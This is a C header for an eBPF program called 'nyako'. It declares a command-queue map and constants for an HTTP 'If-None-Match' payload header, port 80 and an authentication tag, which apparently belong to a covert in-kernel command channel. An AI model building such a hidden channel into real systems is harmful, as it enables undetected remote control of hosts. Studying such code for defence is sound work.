#ifndef NYAKO_KERN_H
#define NYAKO_KERN_H

#include <stddef.h>
#include <linux/bpf.h>
#include <linux/in.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>
#include <string.h>

#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#define BUF_SIZE 64
#define PAYLOAD_HEADER "If-None-Match: "
#define HTTP_PORT 80
#define CMD_QUEQUE_SIZE 16
#define CLIENT_IP_OFFSET 22
#define EXTRA_HEADER_SIZE 30
#define IP_BUF_SIZE 33
#define AUTH_HEADER (unsigned char*)"lo7ct"
#define AUTH_HEADER_SIZE 5

struct hdr_cursor
{
  void *pos;
};

struct cmd_details
{
  unsigned char message[BUF_SIZE];
  unsigned char ip[IP_BUF_SIZE];
};

struct bpf_map_def SEC("maps") cmd_map_array = {
  .type        = BPF_MAP_TYPE_ARRAY,
  .key_size    = sizeof(__u32),
  .value_size  = sizeof(struct cmd_details),
  .max_entries = CMD_QUEQUE_SIZE,
};

// #ifndef lock_xadd
// #define lock_xadd(ptr, val)	((void) __sync_fetch_and_add(ptr, val))
// #endif

#endif